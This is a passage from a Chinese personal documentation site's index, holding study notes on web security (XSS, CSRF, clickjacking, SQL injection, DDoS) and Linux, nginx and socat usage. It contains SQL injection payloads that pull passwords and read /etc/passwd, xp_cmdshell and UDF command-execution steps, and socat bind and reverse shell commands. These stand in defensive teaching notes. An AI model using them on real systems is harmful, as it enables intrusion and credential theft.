”XSS_A“ 时，同时嵌入 B 域上的 ”XSS_B“，则可以达到在 A 域上的 XSS 攻击 B 域用户的目的。  XSS 的防御 #  流行的浏览器都内置了一些对抗 XSS 的措施，比如 FireFox 的 CSP、Noscript 扩展、IE 8 内置的 XSS Filter 等。\n在本章中，主要把精力放在如何为网站设计安全的 XSS 解决方案上。\nHttpOnly #  最早由微软提出，并且在 IE 6 中实现，至今已经逐渐成为一个标准。浏览器将禁止页面的 JavaScript 访问带有 HttpOnly 属性的 Cookie。\nHttpOnly 的出现并非为了对抗 XSS，它解决的是 XSS 后的 Cookie 劫持攻击。\n一个 Cookie 的使用流程如下：\n  浏览器向服务器发起请求，这时没有 Cookie；\n  服务器返回时发送 Set-Cookie 头，向客户端浏览器写入 Cookie；\nSet-Cookie: \u0026lt;name\u0026gt;=\u0026lt;value\u0026gt;[; \u0026lt;Max-Age\u0026gt;=\u0026lt;age\u0026gt;][; expire=\u0026lt;date\u0026gt;][; domain=\u0026lt;domain_name\u0026gt;][; path=\u0026lt;some_path\u0026gt;][; secure][; HttpOnly]\r  在该 Cookie 到期前，浏览器访问域下的所有页面，都将发送该 Cookie；\n  需要注意的是，服务器可能会设置多个 Cookie，而 HttpOnly 可以有选择性地加在任何一个 Cookie 上。\n输入检查 #  在 XSS 防御上，输入检查一般是检查用户输入的数据是否包含一些特殊字符，比如 \u0026lt;、\u0026gt;、'、\u0026quot; 等。如果发现存在特殊字符，则将这些字符过滤或者编码。\n这种输入检查方式被称为 ”XSS Filter“。互联网上有很多开源的 ”XSS Filter“ 的实现。\nXSS Filter 在用户提交数据时获取变量，并进行 XSS 检查，但此时数据并没有结合渲染页面的 HTML 代码，因此 XSS Filter 对语境的理解并不完整。可能会改变用户的数据的语义。\n输出检查 #  一般来说，富文本（Rich Text Format, RTF）的输出外，在变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。\n编码分为很多种，针对 HTML 代码的编码方式时 HtmlEncode：这并非一个专用名词，它只是一种函数实现，它对应的标准时 ISO-8859-1。\n为了对抗 XSS，在编码中至少要求以下的字符被转换：\n   \u0026amp; \u0026lt; \u0026gt; \u0026quot; ' /     \u0026amp;amp; \u0026amp;lt; \u0026amp;gt; \u0026amp;quot; \u0026amp;#x27; \u0026amp;#x2F;    在 OWASP ESAPI 中有一个安全的 JavaScriptEncode 的实现，非常严格。使用举例：\nString safe = ESAPI.encoder().encodeForHTMLAttribute( request.getParameter(\u0026#34;input\u0026#34;) ); // 除了字母，数字外的所有特殊字符都被编码成 HTMLEntities. 对于不同的输出类型，下面列举了多个防御 XSS 的总结。下面用 $var 表示用户数据，它将被填入 HTML 代码中。可能存在以下的场景：\n  在 HTML 标签中输出：\n\u0026lt;a href=#\u0026gt;$var\u0026lt;/a\u0026gt; 在这种场景下，XSS 的利用方式一般是构造一个 \u0026lt;script\u0026gt; 标签。防御方法是是对变量使用 HtmlEncode。\n  在 HTML 属性中输出：\n\u0026lt;div id=\u0026#34;abc\u0026#34; name=\u0026#34;$var\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; 防御方式也是 HtmlEncode。因为这种方式变量是用户不可见的，因此可以采用 OWASP ESAPI 中的严格编码方式，将所有特殊字符都进行编码。\n  在 \u0026lt;script\u0026gt; 标签中输出，应当首先保证输出的变量在引号中：\n\u0026lt;script\u0026gt;\rvar x = \u0026quot;$var\u0026quot;;\r\u0026lt;/script\u0026gt;\r因此攻击者需要闭合引号才能实施攻击，防御时使用 JavascriptEncode。\n  在事件中输出：\n\u0026lt;a href=# onclick=\u0026quot;funcA('$var')\u0026quot;\u0026gt;test\u0026lt;/a\u0026gt;\r这个输出域在 \u0026lt;script\u0026gt; 标签中的输出类似。在防御时使用 JavascriptEncode。\n  在 css 中输出，攻击方式见 利用 CSS 构造。\n可见利用 css 的攻击可谓是相当丰富。因此我们应当尽可能禁止用户可控制的变量在 \u0026lt;style\u0026gt; 标签、html 标签的 style 属性、以及 css 文件中输出。如果一定有这样的需求，建议使用 OWASP ESAPI 中的函数 encodeForCSS()：\nString safe = ESAPI.encoder().encodeForCSS( request.getParameter(\u0026#34;input\u0026#34;) ); 它会把除了字母、数字外的所有字符都编码成十六进制的形式 \\uHH。\n  在地址中输出：\n\u0026lt;a href=\u0026#34;http://hacker.org/?test=$var\u0026#34;\u0026gt;test\u0026lt;/a\u0026gt;s 一般来说使用函数 URLEncode 即可，它会将字符转化为 %HH 的形式。\n但是还有一种情况，就是整个 URL 都能够被用户控制，这时 URL 的 Protocal 部门与 Host 部分是不能够使用 URLEncode 的，否则会改变 URL 的含义。\n攻击者可能会通过构造 javascript、vbscript、dataURI 等伪协议导致脚本攻击：\n\u0026lt;a href=\u0026#34;javascript:alert(1)\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; dataURI 伪协议是 Mozilla 浏览器支持的，能够写一段代码在 URL 中：\n\u0026lt;a href=\u0026#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\u0026#34;\u0026gt;   "},{"id":65,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/3.%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0csrf/","title":"3.跨站点请求伪造 Csrf","section":"1.客户端安全","content":"跨站点请求伪造 CSRF #   CSRF: Cross Site Request Forgery\n CSRF 的防御 #  验证码 #  CSRF 攻击的过程，往往是在用户不知情的情况下构造了网络请求。因此在通常情况下，验证码能够很好地遏制 CSRF 攻击。\n但是验证码并非万能。很多时候，处于用户体验考虑，网站并不能给所有的操作都加上验证码。\nRefer Check #  Refer Check 在互联网中最常见的应用就是防止图片盗链：\n 盗链：服务商自己不提供服务的内容，通过技术手段绕过其它有利益的最终用户界面（如广告），直接在自己的网站上向最终用户提供其它服务提供商的服务内容，骗取最终用户的浏览和点击率。  通过同样的原理，Refer Check 也可以用于检查请求是否来自合法的 “源”。\n即使我们能够通过检查 Refer 是否合法来判断用户是否被 CSRF 攻击，也仅仅是满足了防御的充分非必要条件。Refer Check 的缺陷在于，服务器并非任何时候都能取到 Refer。很多时候处于隐私考虑、或者是浏览器限制了 Refer 的发送。\n因此我们无法依赖 Refer Check 作为防御 CSRF 的主要手段。但是我们可以用它监控 CSRF 攻击的发生。\nAnti CSRF Token #  CSRF 为什么可以攻击成功呢？\n 其本质原因是，重要操作的所有参数都是可以被攻击者猜测的。攻击者只有预测除了 URL 的所有参数与参数值，才能成功地构造一个伪造的请求。 处于这个原因我们可以使用一些随机数把参数加密，使攻击者无法猜测到参数值。  这种方式就叫做 Anti CSRF Token。\n因为 Token 的存在，服务器只需要验证表单中的 Token 与用户的 Session（或 Cookie）中的 Token 是否一致，如果一致则认为是合法请求；否则非法。\n使用 Anti CSRF Token 的时候需要注意：\n Token 的生成一定要足够随机，需要使用安全的随机数生成器生成 Token； Token 的目的不是为了防止重复提交。为了使用方便，可以允许在一个用户的有效生命周期内，都使用同一个 Token。如果用户已经提交了表单，应当重新生成一个； 如果用户打开多个窗口，应当考虑生成多个有效 Token，解决多页面共存问题； 注意 Token 的保密性。不应该发送 GET 请求，导致出现在某个页面的 URL 中；  CSRF 的 Token 仅仅用于对抗 CSRF 攻击，当网站还存在 XSS 漏洞时，这个方案就会变得无效。在 XSS 攻击下，攻击者完全可以请求页面后，读出页面内容里的 Token 值，再构造一个合法的请求，这个过程可以称之为 XSRF，和 CSRF 以示区分。\n"},{"id":66,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/4.%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81clickjacking/","title":"4.点击劫持 Click Jacking","section":"1.客户端安全","content":"点击劫持 Click Jacking #  防御 Click Jacking #  frame busting #  通常可以写一段 JavaScript 代码，以禁止 iframe 的嵌套。这种方法叫做 frame busting。比如：\nif (top.location != location) top.location = self.location 但是这种方法也存在一些缺陷，因为它是用 JavaScript 写的，控制能力并不是特别强，因此有许多方法可以绕过它。比如上面的方法就可以用嵌套多个 iframe 的方法绕过：\nAttacker top frame: # 自学笔记 (pdf) \u0026lt;iframe src=\u0026#34;attacker2.html\u0026#34;\u0026gt; Attacker sub-frame: \u0026lt;iframe src=\u0026#34;http://victim.com\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/iframe\u0026gt; X-Frame-Options #  因为 frame busting 存在被绕过的可能，所以我们需要更好的方法。一个比较好的方案是使用一个 HTTP 请求头——X-Frame-Options，这个请求头可以说是为了解决 Click Jacking 而生的。\n  当这个值为 DENY 时，浏览器会拒绝当前页面加载任何 frame 页面；\n  若值为 SAMEORIGIN 时，则可以定义允许 frame 加载的页面地址。\n  "},{"id":67,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/5.html5%E5%AE%89%E5%85%A8/","title":"5. Html5安全","section":"1.客户端安全","content":"HTML5 安全 #   佘崧林认为这已经是一个过时的概念了。\n "},{"id":68,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/2.%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E5%85%A8/1.%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/","title":"1.注入攻击","section":"2.服务端安全","content":"注入攻击 #   Akamai 在 2019 年研究表明 65.1% 的 Web 应用程序攻击来自 SQL 注入\n SQL 注入的两种分类：\n  盲注：在服务器没有错误回显时完成的注入攻击。\n  Timing Attack：利用 MySQL 的 BENCHMARK() 函数。\n  数据库攻击技巧 #  常见攻击技巧 #  我们假设后台的服务存在这样一个没有校验的语句：\n$id = $_GET[\u0026#34;id\u0026#34;]; $sql = \u0026#34;select title,description,body from items where id=\u0026#34;.$id; SQL 注入时基于数据库的一种攻击。不同的数据库有着不同的功能、不同的语法和函数：\n  SQL 注入可以猜解出数据库的对应版本，比如下面这段 Payload，如果 MySQL 的版本是 4，则会返回 TRUE：\nhttp://victim.com/index.php?id=5 and substring(@@version, 1, 1)=4   测试表名 admin 是否存在，列名 passwd 是否存在：\nhttp://victim.com/index.php?id=5 union all select 1,2,3 from admin http://victim.com/index.php?id=5 union all select 1,2,passwd from admin   想要进一步猜解除 username 和 password 具体的值，可以通过判断字符的范围读出来：\nhttp://victim.com/index.php?id=5 and ascii(substring((select concat(username, 0x3a, passwd) from users limit 0,1),1,1))\u0026gt;64 .... 可见利用一个 sql 注入的过程非常繁琐，所以非常有必要使用一个自动化的工具来帮助完成整个过程，sqlmap 就是一个非常好的自动注入工具：\npython sqlmap.py -u \u0026#34;http://victim.com.index.php?id=5\u0026#34; --dump -T users   在 MySQL 中，可以通过 LOAD_FILE() 读取文件系统，并且通过 INTO DUMPFILE 写入本地文件。另外，如果要将文件读出后，再把结果返还给攻击者，可以使用下面的技巧：\ncreate table potatoes(line BLOB); select 1,1,hex(LOAD_FILE(\u0026#39;/etc/passwd\u0026#39;)),1,1 into DUMPFILE \u0026#39;/tmp/potatoes\u0026#39;; LOAD DATA INFILE \u0026#39;/tmp/potatoes\u0026#39; into table potatos;   上面写入文件的技巧，经常被用于导出一个 webshell，为攻击者的进一步攻击做铺垫。\n因此再设计数据库安全方案时，可以禁止数据库用户具备操作文件的权限。\n命令执行 #  除了可以通过导出 webshell 间接地执行命令外，还可以利用 “用户自定义函数 UDF” 的技巧来执行命令。大多数数据库一般都支持从本地文件系统中导入一个链接库文件作为自定义函数。\n通过以下的语法就可以简历 UDF：\ncreate function f_name returns integer soname shared_library; 安全研究者们发现通过 lib_mysqludf_sys 中提供的几个函数（主要是 sys_eval 与 sys_exec()）就可以执行系统命令。在攻击过程中，将 lib_mysqludf_sys.so 上传到数据库能访问的路径下，并且创建了 UDF 之后就可以执行系统命令了。这个链接库主要有以下四个函数：\n sys_eval()：执行任意命令，并且将输出返回； sys_exec()：执行任意命令。并且将退出码返回； sys_get、sys_set()：获取、修改（创建）一个环境变量；  共享链接库可以通过开源信息获得：\nwget --no-check-certificate https://github.com/mysqludf/lib_mysqludf_sys/raw/master/lib_mysqludf_sys.so sqlmap 中也集成了这个功能：\npython sqlmap.py -u \u0026#34;http://victim.com.index.php?id=5\u0026#34; --os-cmd id -v 1 UDF 不仅仅是 MySQL 的特性，其他数据库也有着类似的功能。利用 UDF 的功能实施攻击的技巧也大同小异。比如：\n 在 MS SQL-Server 中，可以直接使用存储过程 xp_cmdshell 执行命令； 在 Oracle 数据库中，如果服务器同时还有 Java 环境，那么也可能造成命令执行。  一般来说，在数据库中执行系统命令，要求具有较高的权限。\n攻击存储过程 #  存储过程为数据库提供了强大的功能，它与 UDF 很像，但它必须使用 CALL 或者 EXECUTE 来执行。在注入攻击的过程中，存储过程将为攻击者提供很大的便利。\n在微软 SQL-Server 中 xp_cmdshell 可谓是臭名昭著了，它在 2000 版本中是默认开启的，但在 2005 以及以后的版本中则被默认禁止了：\nEXEC master.dbo.xp_cmdshell 'cmd.exe dir C:'\r但是如果当前数据库用户拥有 sysadmin 权限，则可以使用 sp_configure （2005 与 2008 版本）或 sp_addextendedproc（2000 版本）重新开启它：\nEXEC sp_configure 'show advanced options',1\rRECONFIGURE\rEXEC sp_configure 'xp_cmdshell',1\rRECONFIGURE\r除了 xp_cmdshell 可以用于执行命令外。还有其他一些有用的函数。比如 xp_regread 可以操作注册表等等。\nSQL Column Truncation #  在 MySQL 的配置选项中，有一个 sql_mode 选项。以下命令开启 strict 模式：\nsql-mode=\u0026#34;STRICT_TRANS_TABLE,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\u0026#34; 当 MySQL 的 sql-mode 设置为 default 时（即没有开启 STRICT_ALL_TABLES），MySQL 对于超长值只会提示 warning 而不是 error，这可能导致一些截断问题。\n如果用户在数据库中插入一个之前已经存在的数据，则可能造成一些越权访问。\n防御 SQL 注入 #  一些绕过技巧 #  SQL 注入的防御并不是一件简单的事情，开发者往往会走入一些误区。比如只对用户输入做一些 escape 处理，这是不够的。比如：\n$rawsql = \u0026#34;SELECT id,name,mail,cv,blog,twitter FROM register WHERE id =\u0026#34; $id = mysql_real_escape_string($_GET[\u0026#39;id\u0026#39;]); $sql = $rawsql.$id 当攻击者构造如下的注入代码时，仍然会注入成功：\nhttp://victim.com/index.php?id=12,AND,1=0,union,select,1,concat(user,0x3a,password),3,4,5,6,from,mysql.user,whrere,user=substring_index(current_user(),char(64),1) 这是因为 php_real_escape_string() 这个函数仅仅会转义：\n '、\u0026quot;、\\r、\\n、NULL、Ctrl-Z  那么是否增加一些比如空格之类的过滤字符，就可以了呢？基于黑名单的方法总是存在问题的。比如下面就是几个不需要使用空格的例子：\nSELECT/**/passwd/**/from/**/user/**/ SELECT(passwd)FROM(user) 不需要引号，可以用十六进制编码字符串：\nSELECT passwd FROM users WHERE user=0x61646D696E 那么应该如何防御 SQL 注入呢？\n使用预编译 #  防御 SQL 注入的最佳方式就是：使用预编译语句绑定变量。\n比如在 JAVA 中使用预编译的 SQL 语句：\nString custname = requeset.getParameter(\u0026#34;customerName\u0026#34;); String query = \u0026#34;SELECT account_balance FROM user_data WHERE user_name = ?\u0026#34;; Preparedstatement patmt = connection.prepareStatement( query ); patmt.setString(1, custname); ResultSet results = pstmt.executeQuery(); 在 PHP 中绑定变量的示例：\n$query = \u0026#34;INSERT INTO myCity (Name,CountryCode,District) VALUES (?,?,?)\u0026#34;; $stmt = $mysqli-\u0026gt;prepare($query); $stmt-\u0026gt;bind_parse(\u0026#34;sss\u0026#34;, $val1, $val2, $val3); $val1 = $_GET[\u0026#34;Name\u0026#34;]; $val2 = $_GET[\u0026#34;CountryCode\u0026#34;]; $val3 = $_GET[\u0026#34;District\u0026#34;]; $stmt-\u0026gt;execute(); 使用存储过程 #  除使用预编译语句外，我们还可以使用安全的存储过程对抗 SQL 注入。这个方法与前者类似，区别就是存储过程需要将 SQL 语句定义在数据库中。但需要注意的是，存储过程中也可能会存在注入问题。因此应该尽量避免在存储过程内使用动态的 SQL 语句。\n下面那是一个在 Java 中调用存储过程的例子：\nString custname = request.getParameter(\u0026#34;customerName\u0026#34;); try { CallableStatement cs = connection.prepareCall(\u0026#34;{call sp_getAccountBalance(?)}\u0026#34;); ca.setString(1, custname); Result result = cs.executeQuery(); // .... } catch (SQLException se) { // .... } 检查数据类型 #  检查输入类型，在很大程度上可以对抗 SQL 注入。\n比如下面这段代码，就限制了输入数据的类型只能为整数：\n\u0026lt;?php settype($offset, \u0026#34;integer\u0026#34;); $query = \u0026#34;SELECT id,name FROM products ORDER BY name LIMIT 20 OFFSET $offset;\u0026#34;; ?\u0026gt;使用安全函数 #  一般来说，各种 WEB 语言都实现了一些编码函数，可以帮助对抗 SQL 注入。各种数据库厂商都对这些编码函数进行了一些 “指导”。\n其他注入攻击 #  "},{"id":69,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/2.%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E5%85%A8/2.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"2.文件上传漏洞","section":"2.服务端安全","content":"文件上传漏洞 #  "},{"id":70,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/2.%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E5%85%A8/7.%E5%BA%94%E7%94%A8%E5%B1%82%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BBddos/","title":"7.应用层拒绝服务攻击 Ddo S","section":"2.服务端安全","content":"应用层拒绝服务攻击 DDoS #   DDoS: Distributed Denial of Service，分布式拒绝服务攻击。它被认为是安全领域中最难解决的问题之一，迄今为止也没有一个完美的解决方案。\n DDoS 简介 #  常见的 DDoS 攻击有 SYN Flood、UDP Flood、ICMP Flood。\n其中：SYN Flood 是发现于 1996 年最经典的 DDoS 攻击。它利用了 TCP 协议设计中的缺陷，想要修复这样的缺陷几乎是不可能的事情。它的流程大致如下：\n 攻击者首先伪造大量的源地址 IP，分别向服务器发送大量的 SYN 包； 此时服务器会返回 SYN/ACK 包，但因为源地址是伪造的，服务器并不会应答，会重试并且等待一个 SYN Time（30s - 2min），并且丢弃这个链接； 服务器此时将会消耗大量的资源来处理这种半连接，最后服务器无法理睬正常的连接请求；  对抗 SYN Floow 的主要方法：\n SYN Cookie/SYN Proxy，saferset 等算法； SYN Cookie 的主要思想是为每个 IP 地址分配一个 Cookie，并且统一每个 IP 地址的访问频率。短时间内大量来自同一个 IP 地址的数据包，则会被认为受到攻击。  应用层 DDoS 攻击 #  "},{"id":71,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/latexmanual/","title":"Latex Manual","section":"杂项博客","content":"Latex Command #  Command on Linux #  使用 latex 编译的命令（详细的帮助文档可以使用 --help 参数查看）：\n$ latexmk --help 使用 MikTex 编译的命令（详细的帮助文档可以使用 --help 参数查看）：\n$ telatex --help Latex 安装包目录管理命令（详细的帮助文档可以使用 --help 参数查看）：\n$ kpsewhich --help 手动安装到一个安装目录之后，需要使用以下命令更新 LaTex 的安装包搜索路径：\n$ sudo mktexlsr Command on mac OS X #  "},{"id":72,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/linuxmanual/","title":"Linux Manual","section":"杂项博客","content":"Linux Manual #  通过 SSH 连接服务器 #  通过以下的命令通过 ssh 登陆服务器：\n$ ssh -l \u0026lt;username\u0026gt; \u0026lt;ip\u0026gt; 服务器开放指定端口 #    安装\n$ sudo apt-get install iptables   添加规则。比如以下命令打开 8000 端口：\n$ iptables -A INPUT -p tcp --dport 8000 -j ACCEPT 删除此条添加的规则则使用下面的命令：\n$ iptables -D INPUT -p tcp --dport 8000 -j ACCEPT   保存规则\n$ iptables-save   持续化规则。安装 iptables-persistent 支持：\n$ sudo apt-get install iptables-persistent 使用进行持续化规则：\n$ sudo netfilter-persistent save $ sudo netfilter-persistent reload   以下命令查看所有的规则：\n$ iptables -L   服务器查看端口 #  使用 netstat 查看端口占用情况 #  There\u0026rsquo;s a few parameters to netstat that are useful for this :\n  -l or --listening shows only the sockets currently listening for incoming connection.\n  -a or --all shows all sockets currently in use.\n  -t or --tcp shows the tcp sockets.\n  -u or --udp shows the udp sockets.\n  -n or --numeric shows the hosts and ports as numbers, instead of resolving in dns and looking in /etc/services.\n  -plten：查看正在被激活的互联网连接。\n  使用 nmap 扫描对公网开放 ip #  Nmap (\u0026ldquo;Network Mapper\u0026rdquo;) is a free and open source utility for network exploration or security auditing：\n$ nmap hosting-name 杀死占用一个端口的进程 #  这个命令会给出绑定在指定端口上的进程的 PID：\n$ fuser 8080/tcp 加入 -k 选项后会杀死这个 PID 指向的进程：\n$ fuser -k 8080/tcp 以下命令可以列出所有在监听这个端口的进程：\n$ lsof -i:8080 要杀掉这个列举出的进程，可以使用以下的方式：\n$ kill $(lsof -t -i:8080) # 或者暴力杀死 $ kill -9 $(lsof -t -i:8080) PostScript：查看所有进程 PID 并杀死：\n$ ps -ef | grep socat # 比如我们要查看一个 socat 进程 $ kill \u0026lt;PID\u0026gt; 关于反向代理 Ngingx #   学习网址：https://www.jianshu.com/p/fd25a9c008a0\n 配置文件结构 #  apt-get 安装的 Nginx → 配置文件在目录 /etc/nginx/，该目录中有以下文件：\n  nginx.conf：这个是nginx的主配置文件，里面包含了当前目录的所有配置文件，只不过有的是注释状态，需要的时候自行开启（后面几个常用的）。\n  conf.d/：这是一个目录，里面可以写我们自己自定义的配置文件，文件结尾一定是 .conf 才可以生效（当然也可以通过修改 nginx.conf 来取消这个限制）\n  sites-enabled/：这里面的配置文件其实就是 sites-available/ 里面的配置文件的软连接，但是由于 nginx.conf 默认包含的是这个文件夹，所以我们在 sites-available/ 里面建立了新的站点之后,还要建立个软连接到 sites-enabled/ 里面才行\n  sites-available/：这里是我们的虚拟主机的目录，我们在在这里面可以创建多个虚拟主机。\n  反向代理 #  可以用下图表示 Nginx 的工作原理：\ngraph LR; subgraph Client; US1((用户访问)); US2((用户访问)); US3((用户访问)) end subgraph Nginx Server; NS1(监听端口); NS2(处理请求); NS3(负载均衡) end subgraph Web Server; WS1((实际服务)); WS2((实际服务)); WS3((实际服务)); end US1-.-\u0026gt;NS1; US2-.-\u0026gt;NS1; US3-.-\u0026gt;NS1 NS1--\u0026gt;|server_name|NS2; NS2--\u0026gt;|upstream|NS3; NS3-.-\u0026gt;WS1; NS3-.-\u0026gt;WS2; NS3-.-\u0026gt;WS3; 负载均衡 #  Nginx 提供了多种负载均衡的分配方式：\n  轮询（默认方式）：每个请求按时间顺序逐一分配到后端服务器，如果后端服务器down掉,能自动剔除。\n  weight：给后台服务器设置的轮询几率的权值，用于后台服务器性能不均的情况。比如：\nupstream bakend { server 192.168.159.10 weight=10; server 192.168.159.11 weight=10; }   down：表示当前服务器不参与负载。\n  max_fails：允许请求失败的次数，默认为 1。\n  backup：其他所有非 backup 机器暂忙时，请求 backup 机器。这台机器的压力会最小。\n  ip_hash：每个请求按访问 ip 的 hash 结果分配，这样每个访客固定访问一个后端服务器，可以解决 session 的问题。比如：\nupstream resinserver{ ip_hash; server 192.168.159.10:8080; server 192.168.159.11:8080; }   fair：按后端服务器的响应时间来分配请求，响应时间短的优先分配。同上定义。\n  Debug #   总结来源：https://serverfault.com/questions/579919/nginx-1-2-1-how-to-analyse-500-internal-server-error\n   查看 nginx 的配置文件是否正确：\nnginx -t   查看 nginx 的运行状态：\nservice nginx status   查看配置文件中， log 文件中所在位置，查看日志：\nfind /etc/nginx -name \u0026#39;*.conf\u0026#39; | xargs grep -i log   关于 socat #   学习网址：\n https://www.hi-linux.com/posts/61543.html  官网网址：\n http://www.dest-unreach.org/socat/   socat 是一个 netcat(nc) 的替代产品，可以称得上 nc++。作用是在两个流之间建立一个双向的通道。\nsocat 的地址类型很多，有 ip, tcp, udp, ipv6, pipe, exec, system, open, proxy, openssl等。\n基本语法 #  $ socat [options] \u0026lt;address\u0026gt; \u0026lt;address\u0026gt; 几个常用的 address 描述方式如下：\n -, STDIN, STDOUT 表示标准输入输出，可以就用一个横杠代替。 /var/log/syslog 打开一个文件作为数据流，可以是任意路径。 TCP:: 建立一个 TCP 连接作为数据流，TCP 也可以替换为 UDP 。 TCP-LISTEN: 建立\u0008 一个 TCP 监听端口，TCP 也可以替换为 UDP。 EXEC: 执行一个程序作为数据流。  PostScript：以上规则中前面的 TCP 等都可以小写，在这些描述后可以附加一些选项，用逗号隔开。如 fork，reuseaddr，stdin，stdout，ctty 等。\n示例 #    例子一，文件读取，将文件内容连接到标准输入输出流：\n$ socat - /var/www/html/flag.php $ socat - ./flag.php # 路径一般是绝对路径，如果要使用相对路径记得要加上 ./ $ echo \u0026#34;This is a test\u0026#34; | socat - /tmp/test.txt # 写入文件   例子二，网络管理，连接远程端口与监听一个端口：\n$ socat - tcp:\u0026lt;ip_address\u0026gt;:\u0026lt;port\u0026gt; $ socat tcp-listen:8080 -   例子三，端口转发，转发 tcp：\n$ socat -d -d -lf /var/log/socat.log TCP4-LISTEN:15672,bind=192.168.1.252,reuseaddr,fork TCP4:172.17.0.15:15672 # 监听 192.168.1.252 网卡的 15672 端口，并将请求转发至 172.17.0.15 的 15672 端口。 #  # 参数说明： # -d -d：代表调试信息的输出级别。 # -lf /var/log/socat.log：指定输出信息的文件保存位置。  # TCP4-LISTEN:15672 在本地建立一个 TCP IPv4 协议的监听端口，也就是转发端口。 # bind 指定监听绑定的 IP 地址，不绑定的话将监听服务器上可用的全部 IP。 # reuseaddr 绑定一个本地端口。 # fork TCP4:172.17.0.15:15672 指的是要转发到的服务器 IP 和端口，这里是 172.17.0.15 的 15672 端口。 NAT 映射：在外部公网服务器上执行：\n$ socat tcp-listen:1234 tcp-listen:3389 在内网服务器上执行：\n$ socat tcp:outerhost:1234 tcp:192.168.1.34:3389 这样，你外部机器上的 3389 就映射在内网 192.168.1.34 的 3389 端口上了。不过这样\u0008场景下更推荐内网\u0008穿透神器 FRP，如果你不会使用，可参考 推荐一款很好用的内网穿透工具–FRP 一文。\n  例子四，文件传递：将文件 demo.tar.gz 使用 2000 端口从 192.168.1.252 传到 192.168.1.253, 文件传输完毕后会自动退出。\n在 192.168.1.252 上执行：\n$ socat -u open:demo.tar.gz tcp-listen:2000,reuseaddr 在 192.168.1.253 上执行：\n$ socat -u tcp:192.168.1.252:2000 open:demo.tar.gz,create   例子五，建立 shell 。\n建立一个正向 shell。在服务器上执行：\n# 在服务端 7005 端口建立一个 Shell。 $ socat TCP-LISTEN:7005,fork,reuseaddr EXEC:/bin/bash,pty,stderr # 或者 $ socat TCP-LISTEN:7005,fork,reuseaddr system:bash,pty,stderr 在客户端执行：\n# 连接到服务器的 7005 端口，即可获得一个 Shell。readline 是 GNU 的命令行编辑器，具有历史功能。 $ socat readline tcp:127.0.0.1:7005 反弹一个交互式的 shell。在服务器上执行：\n$ socat -,raw,echo=0 tcp-listen:7005 在客户端上执行：\n$ socat tcp-connect:192.168.1.252:7005 exec:\u0026#39;bash -li\u0026#39;,pty,stderr,setsid,sigint,sane   例子六，让 socat 在后台运行。默认情况下 Socat 只在前台运行，如果要让 Socat 一直在后台运行，可以使用 nohup 命令来保证其在后台一直运行。\n$ nohup socat -d -d -lf /var/log/socat.log TCP4-LISTEN:15672,bind=192.168.1.252,reuseaddr,fork TCP4:172.17.0.15:15672 \u0026amp;    "},{"id":73,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8/","title":"客户端本地存储","section":"杂项博客","content":" 在实习过程中，在字节跳动内部分享上学习的东西\n :floppy_disk:客户端本地存储 #  作用 #  客户端本地存储主要有以下的几个作用：\n 作为网络 IO 的缓存：缓存图片、缓存接口的 Response； 保存配置或者数据：配置信息、状态信息、日志信息、Crash 信息等； 作为内存的 Backing Store：暂存大文件、征用扩展内存；  常见存储方案分析 #  如何分析各种存储方案，主要考虑以下几个特性：\n 读写性能：平均读写性能、最坏读写性能； 并发性能：是否线程安全、读写操作互相并发的能力； 数据完整性：数据损失或丢失的概率； 空间性能：存储相同的数据，需要的磁盘与内存空间；  Plist #  plist 是一种 xml 格式，是 iOS 中最常用的配置存储数据格式，下面是一个例子：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; 